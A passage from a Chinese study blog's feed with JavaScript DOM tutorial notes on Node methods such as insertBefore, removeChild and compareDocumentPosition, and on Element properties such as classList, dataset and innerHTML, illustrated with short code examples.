<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(p, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p</code>将成为<code>document.body</code>的最后一个子节点。这也说明<code>insertBefore</code>的第二个参数不能省略。</p>
<p>注意，如果所要插入的节点是当前 DOM 现有的节点，则该节点将从原有的位置移除，插入新的位置。</p>
<p>由于不存在<code>insertAfter</code>方法，如果新节点要插在父节点的某个子节点后面，可以用<code>insertBefore</code>方法结合<code>nextSibling</code>属性模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">parent.insertBefore(s1, s2.nextSibling);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>parent</code>是父节点，<code>s1</code>是一个全新的节点，<code>s2</code>是可以将<code>s1</code>节点，插在<code>s2</code>节点的后面。如果<code>s2</code>是当前节点的最后一个子节点，则<code>s2.nextSibling</code>返回<code>null</code>，这时<code>s1</code>节点会插在当前节点的最后，变成当前节点的最后一个子节点，等于紧跟在<code>s2</code>的后面。</p>
<p>如果要插入的节点是<code>DocumentFragment</code>类型，那么插入的将是<code>DocumentFragment</code>的所有子节点，而不是<code>DocumentFragment</code>节点本身。返回值将是一个空的<code>DocumentFragment</code>节点。</p>
<h5 id="2-2-5-Node-prototype-removeChild"><a href="#2-2-5-Node-prototype-removeChild" class="headerlink" title="2.2.5 Node.prototype.removeChild()"></a>2.2.5 Node.prototype.removeChild()</h5><p><code>removeChild</code>方法接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divA = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">divA.parentNode.removeChild(divA);</span><br></pre></td></tr></table></figure>
<p>上面代码移除了<code>divA</code>节点。注意，这个方法是在<code>divA</code>的父节点上调用的，不是在<code>divA</code>上调用的。</p>
<p>下面是如何移除当前节点的所有子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;top&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (element.firstChild) &#123;</span><br><span class="line">  element.removeChild(element.firstChild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>被移除的节点依然存在于内存之中，但不再是 DOM 的一部分。所以，一个节点移除以后，依然可以使用它，比如插入到另一个节点下面。</p>
<p>如果参数节点不是当前节点的子节点，<code>removeChild</code>方法将报错。</p>
<h5 id="2-2-6-Node-prototype-replaceChild"><a href="#2-2-6-Node-prototype-replaceChild" class="headerlink" title="2.2.6 Node.prototype.replaceChild()"></a>2.2.6 Node.prototype.replaceChild()</h5><p><code>replaceChild</code>方法用于将一个新的节点，替换当前节点的某一个子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> replacedNode = parentNode.replaceChild(newChild, oldChild);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>replaceChild</code>方法接受两个参数，第一个参数<code>newChild</code>是用来替换的新节点，第二个参数<code>oldChild</code>是将要替换走的子节点。返回值是替换走的那个节点<code>oldChild</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divA = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;divA&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> newSpan = <span class="built_in">document</span>.createElement(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">newSpan.textContent = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line">divA.parentNode.replaceChild(newSpan, divA);</span><br></pre></td></tr></table></figure>
<p>上面代码是如何将指定节点<code>divA</code>替换走</p>
<h5 id="2-2-7-Node-prototype-contains"><a href="#2-2-7-Node-prototype-contains" class="headerlink" title="2.2.7 Node.prototype.contains()"></a>2.2.7 Node.prototype.contains()</h5><p><code>contains</code>方法返回一个布尔值，表示参数节点是否满足以下三个条件之一。</p>
<ul>
<li>参数节点为当前节点。</li>
<li>参数节点为当前节点的子节点。</li>
<li>参数节点为当前节点的后代节点。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.contains(node)</span><br></pre></td></tr></table></figure>
<p>上面代码检查参数节点<code>node</code>，是否包含在当前文档之中。</p>
<p>注意，当前节点传入<code>contains</code>方法，返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">nodeA.contains(nodeA) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h5 id="2-2-8-Node-prototype-compareDocumentPosition"><a href="#2-2-8-Node-prototype-compareDocumentPosition" class="headerlink" title="2.2.8 Node.prototype.compareDocumentPosition()"></a>2.2.8 Node.prototype.compareDocumentPosition()</h5><p><code>compareDocumentPosition</code>方法的用法，与<code>contains</code>方法完全一致，返回一个六个比特位的二进制值，表示参数节点与当前节点的关系。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;mydiv&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;form&gt;&lt;input id=&quot;test&quot; /&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.compareDocumentPosition(input) <span class="comment">// 20</span></span><br><span class="line">input.compareDocumentPosition(div) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，节点<code>div</code>包含节点<code>input</code>（二进制<code>010000</code>），而且节点<code>input</code>在节点<code>div</code>的后面（二进制<code>000100</code>），所以第一个<code>compareDocumentPosition</code>方法返回<code>20</code>（二进制<code>010100</code>，即<code>010000 + 000100</code>），第二个<code>compareDocumentPosition</code>方法返回<code>10</code>（二进制<code>001010</code>）。</p>
<p>由于<code>compareDocumentPosition</code>返回值的含义，定义在每一个比特位上，所以如果要检查某一种特定的含义，就需要使用比特位运算符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> head = <span class="built_in">document</span>.head;</span><br><span class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.body;</span><br><span class="line"><span class="keyword">if</span> (head.compareDocumentPosition(body) &amp; <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;文档结构正确&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;&lt;body&gt; 不能在 &lt;head&gt; 前面&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>compareDocumentPosition</code>的返回值与4（又称掩码）进行与运算（<code>&amp;</code>），得到一个布尔值，表示<code>&lt;head&gt;</code>是否在<code>&lt;body&gt;</code>前面。</p>
<h5 id="2-2-9-Node-prototype-isEqualNode-，Node-prototype-isSameNode"><a href="#2-2-9-Node-prototype-isEqualNode-，Node-prototype-isSameNode" class="headerlink" title="2.2.9 Node.prototype.isEqualNode()，Node.prototype.isSameNode()"></a>2.2.9 Node.prototype.isEqualNode()，Node.prototype.isSameNode()</h5><p><code>isEqualNode</code>方法返回一个布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">p1.isEqualNode(p2) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>isSameNode</code>方法返回一个布尔值，表示两个节点是否为同一个节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">p1.isSameNode(p2) <span class="comment">// false</span></span><br><span class="line">p1.isSameNode(p1) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h5 id="2-2-10-Node-prototype-normalize"><a href="#2-2-10-Node-prototype-normalize" class="headerlink" title="2.2.10 Node.prototype.normalize()"></a>2.2.10 Node.prototype.normalize()</h5><p><code>normalize</code>方法用于清理当前节点内部的所有文本节点（text）。它会去除空的文本节点，并且将毗邻的文本节点合并成一个，也就是说不存在空的文本节点，以及毗邻的文本节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wrapper = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"></span><br><span class="line">wrapper.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">&#x27;Part 1 &#x27;</span>));</span><br><span class="line">wrapper.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">&#x27;Part 2 &#x27;</span>));</span><br><span class="line"></span><br><span class="line">wrapper.childNodes.length <span class="comment">// 2</span></span><br><span class="line">wrapper.normalize();</span><br><span class="line">wrapper.childNodes.length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码使用<code>normalize</code>方法之前，<code>wrapper</code>节点有两个毗邻的文本子节点。使用<code>normalize</code>方法之后，两个文本子节点被合并成一个。</p>
<p>该方法是<code>Text.splitText</code>的逆方法，可以查看《Text 节点对象》一章，了解更多内容。</p>
<h5 id="2-2-11-Node-prototype-getRootNode"><a href="#2-2-11-Node-prototype-getRootNode" class="headerlink" title="2.2.11 Node.prototype.getRootNode()"></a>2.2.11 Node.prototype.getRootNode()</h5><p><code>getRootNode()</code>方法返回当前节点所在文档的根节点<code>document</code>，与<code>ownerDocument</code>属性的作用相同。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.firstChild.getRootNode() === <span class="built_in">document</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.body.firstChild.getRootNode() === <span class="built_in">document</span>.body.firstChild.ownerDocument</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>该方法可用于<code>document</code>节点自身，这一点与<code>document.ownerDocument</code>不同。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getRootNode() <span class="comment">// document</span></span><br><span class="line"><span class="built_in">document</span>.ownerDocument <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-Node接口</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0039</title>
    <url>/2021/05/25/%E6%89%93%E5%8D%A10039/</url>
    <content><![CDATA[<p><font color=#9b95c9>星光不问赶路人，时光不负有心人。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="6-Element-节点"><a href="#6-Element-节点" class="headerlink" title="6. Element 节点"></a>6. Element 节点</h3><h4 id="6-1-简介"><a href="#6-1-简介" class="headerlink" title="6.1 简介"></a>6.1 简介</h4><p><code>Element</code>节点对象对应网页的 HTML 元素。每一个 HTML 元素，在 DOM 树上都会转化成一个<code>Element</code>节点对象（以下简称元素节点）。</p>
<p>元素节点的<code>nodeType</code>属性都是<code>1</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.nodeName <span class="comment">// &quot;P&quot;</span></span><br><span class="line">p.nodeType <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p><code>Element</code>对象继承了<code>Node</code>接口，因此<code>Node</code>的属性和方法在<code>Element</code>对象都存在。</p>
<p>此外，不同的 HTML 元素对应的元素节点是不一样的，浏览器使用不同的构造函数，生成不同的元素节点，比如<code>&lt;a&gt;</code>元素的构造函数是<code>HTMLAnchorElement()</code>，<code>&lt;button&gt;</code>是<code>HTMLButtonElement()</code>。因此，元素节点不是一种对象，而是许多种对象，这些对象除了继承<code>Element</code>对象的属性和方法，还有各自独有的属性和方法。</p>
<span id="more"></span>

<h4 id="6-2-实例属性"><a href="#6-2-实例属性" class="headerlink" title="6.2 实例属性"></a>6.2 实例属性</h4><h5 id="6-2-1-元素特性的相关属性"><a href="#6-2-1-元素特性的相关属性" class="headerlink" title="6.2.1 元素特性的相关属性"></a>6.2.1 元素特性的相关属性</h5><p>######(1) Element.id<br><code>Element.id</code>属性返回指定元素的<code>id</code>属性，该属性可读写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为 &lt;p id=&quot;foo&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.id <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>id</code>属性的值是大小写敏感，即浏览器能正确识别<code>&lt;p id=&quot;foo&quot;&gt;</code>和<code>&lt;p id=&quot;FOO&quot;&gt;</code>这两个元素的<code>id</code>属性，但是最好不要这样命名。</p>
<h6 id="2-Element-tagName"><a href="#2-Element-tagName" class="headerlink" title="(2) Element.tagName"></a>(2) Element.tagName</h6><p><code>Element.tagName</code>属性返回指定元素的大写标签名，与<code>nodeName</code>属性的值相等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;span id=&quot;myspan&quot;&gt;Hello&lt;/span&gt;</span></span><br><span class="line"><span class="keyword">var</span> span = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myspan&#x27;</span>);</span><br><span class="line">span.id <span class="comment">// &quot;myspan&quot;</span></span><br><span class="line">span.tagName <span class="comment">// &quot;SPAN&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="3-Element-dir"><a href="#3-Element-dir" class="headerlink" title="(3) Element.dir"></a>(3) Element.dir</h6><p><code>Element.dir</code>属性用于读写当前元素的文字方向，可能是从左到右（<code>&quot;ltr&quot;</code>），也可能是从右到左（<code>&quot;rtl&quot;</code>）。</p>
<h6 id="4-Element-accessKey"><a href="#4-Element-accessKey" class="headerlink" title="(4) Element.accessKey"></a>(4) Element.accessKey</h6><p><code>Element.accessKey</code>属性用于读写分配给当前元素的快捷键。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;button accesskey=&quot;h&quot; id=&quot;btn&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line">btn.accessKey <span class="comment">// &quot;h&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>btn</code>元素的快捷键是h，按下<code>Alt + h</code>就能将焦点转移到它上面。</p>
<h6 id="5-Element-draggable"><a href="#5-Element-draggable" class="headerlink" title="(5) Element.draggable"></a>(5) Element.draggable</h6><p><code>Element.draggable</code>属性返回一个布尔值，表示当前元素是否可拖动。该属性可读写。</p>
<h6 id="6-Element-lang"><a href="#6-Element-lang" class="headerlink" title="(6) Element.lang"></a>(6) Element.lang</h6><p><code>Element.lang</code>属性返回当前元素的语言设置。该属性可读写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.lang <span class="comment">// &quot;en&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="7-Element-tabIndex"><a href="#7-Element-tabIndex" class="headerlink" title="(7) Element.tabIndex"></a>(7) Element.tabIndex</h6><p><code>Element.tabIndex</code>属性返回一个整数，表示当前元素在 Tab 键遍历时的顺序。该属性可读写。</p>
<p><code>tabIndex</code>属性值如果是负值（通常是<code>-1</code>），则 Tab 键不会遍历到该元素。如果是正整数，则按照顺序，从小到大遍历。如果两个元素的<code>tabIndex</code>属性的正整数值相同，则按照出现的顺序遍历。遍历完所有<code>tabIndex</code>为正整数的元素以后，再遍历所有<code>tabIndex</code>等于<code>0</code>、或者属性值是非法值、或者没有<code>tabIndex</code>属性的元素，顺序为它们在网页中出现的顺序。</p>
<h6 id="8-Element-title"><a href="#8-Element-title" class="headerlink" title="(8) Element.title"></a>(8) Element.title</h6><p><code>Element.title</code>属性用来读写当前元素的 HTML 属性<code>title</code>。该属性通常用来指定，鼠标悬浮时弹出的文字提示框。</p>
<h5 id="6-2-2-元素状态的相关属性"><a href="#6-2-2-元素状态的相关属性" class="headerlink" title="6.2.2 元素状态的相关属性"></a>6.2.2 元素状态的相关属性</h5><h6 id="1-Element-hidden"><a href="#1-Element-hidden" class="headerlink" title="(1) Element.hidden"></a>(1) Element.hidden</h6><p><code>Element.hidden</code>属性返回一个布尔值，表示当前元素的<code>hidden</code>属性，用来控制当前元素是否可见。该属性可读写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mydiv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  mydiv.hidden = !mydiv.hidden;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>注意，该属性与 CSS 设置是互相独立的。CSS 对这个元素可见性的设置，<code>Element.hidden</code>并不能反映出来。也就是说，这个属性并不能用来判断当前元素的实际可见性。</p>
<p>CSS 的设置高于<code>Element.hidden</code>。如果 CSS 指定了该元素不可见（<code>display: none</code>）或可见（<code>display: hidden</code>），那么<code>Element.hidden</code>并不能改变该元素实际的可见性。换言之，这个属性只在 CSS 没有明确设定当前元素的可见性时才有效。</p>
<h6 id="2-Element-contentEditable，Element-isContentEditable"><a href="#2-Element-contentEditable，Element-isContentEditable" class="headerlink" title="(2) Element.contentEditable，Element.isContentEditable"></a>(2) Element.contentEditable，Element.isContentEditable</h6><p>HTML 元素可以设置<code>contentEditable</code>属性，使得元素的内容可以编辑。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div contenteditable&gt;<span class="number">123</span>&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>&lt;div&gt;</code>元素有<code>contenteditable</code>属性，因此用户可以在网页上编辑这个区块的内容。</p>
<p><code>Element.contentEditable</code>属性返回一个字符串，表示是否设置了<code>contenteditable</code>属性，有三种可能的值。该属性可写。</p>
<ul>
<li><code>&quot;true&quot;</code>：元素内容可编辑</li>
<li><code>&quot;false&quot;</code>：元素内容不可编辑</li>
<li><code>&quot;inherit&quot;</code>：元素是否可编辑，继承了父元素的设置</li>
</ul>
<p><code>Element.isContentEditable</code>属性返回一个布尔值，同样表示是否设置了<code>contenteditable</code>属性。该属性只读。</p>
<h5 id="6-2-3-Element-attributes"><a href="#6-2-3-Element-attributes" class="headerlink" title="6.2.3 Element.attributes"></a>6.2.3 Element.attributes</h5><p><code>Element.attributes</code>属性返回一个类似数组的对象，成员是当前元素节点的所有属性节点，详见《属性的操作》一章。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> attrs = p.attributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = attrs.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(attrs[i].name + <span class="string">&#x27;-&gt;&#x27;</span> + attrs[i].value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码遍历<code>p</code>元素的所有属性。</p>
<h5 id="6-2-4-Element-className，Element-classList"><a href="#6-2-4-Element-className，Element-classList" class="headerlink" title="6.2.4 Element.className，Element.classList"></a>6.2.4 Element.className，Element.classList</h5><p><code>className</code>属性用来读写当前元素节点的<code>class</code>属性。它的值是一个字符串，每个<code>class</code>之间用空格分割。</p>
<p><code>classList</code>属性返回一个类似数组的对象，当前元素节点的每个<code>class</code>就是这个对象的一个成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码 &lt;div class=&quot;one two three&quot; id=&quot;myDiv&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.className</span><br><span class="line"><span class="comment">// &quot;one two three&quot;</span></span><br><span class="line"></span><br><span class="line">div.classList</span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   0: &quot;one&quot;</span></span><br><span class="line"><span class="comment">//   1: &quot;two&quot;</span></span><br><span class="line"><span class="comment">//   2: &quot;three&quot;</span></span><br><span class="line"><span class="comment">//   length: 3</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>className</code>属性返回一个空格分隔的字符串，而<code>classList</code>属性指向一个类似数组的对象，该对象的<code>length</code>属性（只读）返回当前元素的<code>class</code>数量。</p>
<p><code>classList</code>对象有下列方法。</p>
<ul>
<li><code>add()</code>：增加一个 class。</li>
<li><code>remove()</code>：移除一个 class。</li>
<li><code>contains()</code>：检查当前元素是否包含某个 class。</li>
<li><code>toggle()</code>：将某个 class 移入或移出当前元素。</li>
<li><code>item()</code>：返回指定索引位置的 class。</li>
<li><code>toString()</code>：将 class 的列表转为字符串。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">div.classList.add(<span class="string">&#x27;myCssClass&#x27;</span>);</span><br><span class="line">div.classList.add(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line">div.classList.remove(<span class="string">&#x27;myCssClass&#x27;</span>);</span><br><span class="line">div.classList.toggle(<span class="string">&#x27;myCssClass&#x27;</span>); <span class="comment">// 如果 myCssClass 不存在就加入，否则移除</span></span><br><span class="line">div.classList.contains(<span class="string">&#x27;myCssClass&#x27;</span>); <span class="comment">// 返回 true 或者 false</span></span><br><span class="line">div.classList.item(<span class="number">0</span>); <span class="comment">// 返回第一个 Class</span></span><br><span class="line">div.classList.toString();</span><br></pre></td></tr></table></figure>
<p>下面比较一下，<code>className</code>和<code>classList</code>在添加和删除某个 class 时的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加class</span></span><br><span class="line">foo.className += <span class="string">&#x27;bold&#x27;</span>;</span><br><span class="line">foo.classList.add(<span class="string">&#x27;bold&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除class</span></span><br><span class="line">foo.classList.remove(<span class="string">&#x27;bold&#x27;</span>);</span><br><span class="line">foo.className = foo.className.replace(<span class="regexp">/^bold$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>toggle</code>方法可以接受一个布尔值，作为第二个参数。如果为<code>true</code>，则添加该属性；如果为<code>false</code>，则去除该属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.classList.toggle(<span class="string">&#x27;abc&#x27;</span>, boolValue);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">if</span> (boolValue) &#123;</span><br><span class="line">  el.classList.add(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  el.classList.remove(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6-2-5-Element-dataset"><a href="#6-2-5-Element-dataset" class="headerlink" title="6.2.5 Element.dataset"></a>6.2.5 Element.dataset</h5><p>网页元素可以自定义<code>data-</code>属性，用来添加数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div data-timestamp=<span class="string">&quot;1522907809292&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>&lt;div&gt;</code>元素有一个自定义的<code>data-timestamp</code>属性，用来为该元素添加一个时间戳。</p>
<p><code>Element.dataset</code>属性返回一个对象，可以从这个对象读写<code>data-</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;article</span></span><br><span class="line"><span class="comment">//   id=&quot;foo&quot;</span></span><br><span class="line"><span class="comment">//   data-columns=&quot;3&quot;</span></span><br><span class="line"><span class="comment">//   data-index-number=&quot;12314&quot;</span></span><br><span class="line"><span class="comment">//   data-parent=&quot;cars&quot;&gt;</span></span><br><span class="line"><span class="comment">//   ...</span></span><br><span class="line"><span class="comment">// &lt;/article&gt;</span></span><br><span class="line"><span class="keyword">var</span> article = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">article.dataset.columns <span class="comment">// &quot;3&quot;</span></span><br><span class="line">article.dataset.indexNumber <span class="comment">// &quot;12314&quot;</span></span><br><span class="line">article.dataset.parent <span class="comment">// &quot;cars&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>dataset</code>上面的各个属性返回都是字符串。</p>
<p>HTML 代码中，<code>data-</code>属性的属性名，只能包含英文字母、数字、连词线（<code>-</code>）、点（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>）。它们转成 JavaScript 对应的<code>dataset</code>属性名，规则如下。</p>
<ul>
<li>开头的<code>data-</code>会省略。</li>
<li>如果连词线后面跟了一个英文字母，那么连词线会取消，该字母变成大写。</li>
<li>其他字符不变。</li>
</ul>
<p>因此，<code>data-abc-def</code>对应<code>dataset.abcDef</code>，<code>data-abc-1</code>对应<code>dataset[&quot;abc-1&quot;]</code>。</p>
<p>除了使用<code>dataset</code>读写<code>data-</code>属性，也可以使用<code>Element.getAttribute()</code>和<code>Element.setAttribute()</code>，通过完整的属性名读写这些属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mydiv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mydiv.dataset.foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line">mydiv.getAttribute(<span class="string">&#x27;data-foo&#x27;</span>) <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="6-2-6-Element-innerHTML"><a href="#6-2-6-Element-innerHTML" class="headerlink" title="6.2.6 Element.innerHTML"></a>6.2.6 Element.innerHTML</h5><p><code>Element.innerHTML</code>属性返回一个字符串，等同于该元素包含的所有 HTML 代码。该属性可读写，常用来设置某个节点的内容。它能改写所有元素节点的内容，包括<code>&lt;HTML&gt;</code>和<code>&lt;body&gt;</code>元素。</p>
<p>如果将<code>innerHTML</code>属性设为空，等于删除所有它包含的所有节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.innerHTML = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码等于将<code>el</code>节点变成了一个空节点，<code>el</code>原来包含的节点被全部删除。</p>
<p>注意，读取属性值的时候，如果文本节点包含<code>&amp;</code>、小于号（<code>&lt;</code>）和大于号（<code>&gt;</code>），<code>innerHTML</code>属性会将它们转为实体形式<code>&amp;amp;</code>、<code>&amp;lt;</code>、<code>&amp;gt;</code>。如果想得到原文，建议使用<code>element.textContent</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML代码如下 &lt;p id=&quot;para&quot;&gt; 5 &gt; 3 &lt;/p&gt;</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;para&#x27;</span>).innerHTML</span><br><span class="line"><span class="comment">// 5 &amp;gt; 3</span></span><br></pre></td></tr></table></figure>
<p>写入的时候，如果插入的文本包含 HTML 标签，会被解析成为节点对象插入 DOM。注意，如果文本之中含有<code>&lt;script&gt;</code>标签，虽然可以生成<code>script</code>节点，但是插入的代码不会执行。</p>
